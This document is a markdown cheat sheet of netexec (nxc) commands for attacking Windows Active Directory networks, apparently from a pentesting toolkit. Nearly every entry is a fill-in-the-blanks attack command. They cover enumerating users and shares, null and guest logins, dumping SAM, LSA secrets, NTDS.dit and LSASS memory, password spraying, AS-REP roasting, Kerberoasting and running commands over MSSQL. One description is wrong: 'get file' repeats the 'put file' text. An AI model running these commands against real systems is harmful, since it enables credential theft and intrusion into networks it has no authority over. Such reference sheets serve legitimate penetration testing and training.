# netexec 


#nxc
## nxc - spider
```
nxc smb <target_ip> -u <user> <auth> -d <domain> --spider <share> --pattern . 
```

## nxc - enumerate shares
```
nxc smb <target_ip> -u <user> <auth> -d <domain> --shares
```

## nxc - ldap query
```
nxc ldap <target_ip> -u <user> <auth> -d <domain> --query "(<query>)" "<attribute>|*" 
```

## nxc - generate hosts file
```
nxc smb <target_ip> --generate-hosts-file <hosts-file|/etc/hosts>
```

## nxc - generate krb5 file
```
nxc smb <target_ip> --generate-krb5-file <krb5-file|/etc/krb5.conf>
```

## nxc - generate hosts and krb5 file
```
nxc smb <target_ip> --generate-hosts-file <hosts-file|/etc/hosts> && nxc smb <target_ip> --generate-krb5-file <krb5-file|/etc/krb5.conf>
```

## nxc - generate tgt
```
nxc smb <dc_fqdn> -u <user> <auth> -d <domain>  --generate-tgt <output-file|$USER>
```

## nxc - export users
```
nxc smb <target_ip> -u <user> <auth> -d <domain>  --users-export <output-file>
```

## nxc rid users awk - get domains users from rid brute
```
nxc smb <target_ip> -u <user> <auth> -d <domain> --rid 10000 | awk -F \\ '/SidTypeUser/ {print $2}' | cut -d '(' -f1
```

## nxc - rid users
```
nxc smb <target_ip> -u <user> <auth> -d <domain> --rid 10000
```

## nxc - use kcache
```
nxc <protocol> <dc_fqdn> --use-kcache
```

## nxc - guest login auth
```
nxc smb <target_ip> -u "guest" -p "" --shares
```

## nxc - null login auth
```
nxc ldap <target_ip> -u "" -p ""
```

## nxc - Dump SAM

Dump SAM hashes using methods from secretsdump.py
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

```bash
nxc smb <ip> -u <user> <auth> -d <domain> --sam
```

## nxc - Dump LSA

Dump LSA secrets using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
nxc smb <ip> -u <user> <auth> -d <domain> --lsa
```

## nxc - dump ntds.dit

Dump the NTDS.dit from target DC using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
nxc smb <ip> -u <user> <auth> -d <domain> --ntds
```

## nxc - dump lsass

```bash
nxc smb <ip> -u <user> <auth> -d <domain> -M lsassy
```

## nxc - dump lsass - with bloodhond update

```bash
nxc smb <ip> --local-auth -u <user> -H <<nt_hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
```

## nxc - password spray (user=password)

```bash
nxc smb <dc_ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
```

## nxc - password spray multiple test 

(careful on lockout)

```bash
nxc smb <dc_ip> -u <user.txt> -p <password.txt> --continue-on-success
```

## nxc - put file
Send a local file to the remote target

```bash
nxc smb <ip> -u <user> <auth> --put-file <local_file> <remote_path> --share <share>
```

## nxc - get file
Send a local file to the remote target

```bash
nxc smb <ip> -u <user> <auth> --get-file <remote_path> <local_file> --share <share>
```

## nxc - ASREPRoast enum without authentication

User can be a wordlist too (user.txt)
Hashcat format  -m 18200 

```bash
nxc ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## nxc - ASREPRoast enum with authentication

Hashcat format  -m 18200 

```bash
nxc ldap <ip> -u <user> <auth> --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## nxc - Kerberoasting

Hashcat format  -m 13100

```bash
nxc ldap <ip> -u <user> <auth> --kerberoasting kerberoastables.txt --kdcHost <dc_ip>
```

## nxc - Unconstrained delegation

List of all computers et users with the flag TRUSTED_FOR_DELEGATION

```bash
nxc ldap <ip> -u <user> <auth> --trusted-for-delegation
```

## nxc - winrm-auth

```bash
nxc winrm <ip> -u <user> <auth>
```

## nxc - mssql password spray

```bash
nxc mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce
```

## nxc - mssql execute query

```bash
nxc mssql <ip> -u <user> <auth> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

## nxc - mssql execute command

```bash
nxc mssql <ip> -u <user> <auth> --local-auth -x <cmd>
```


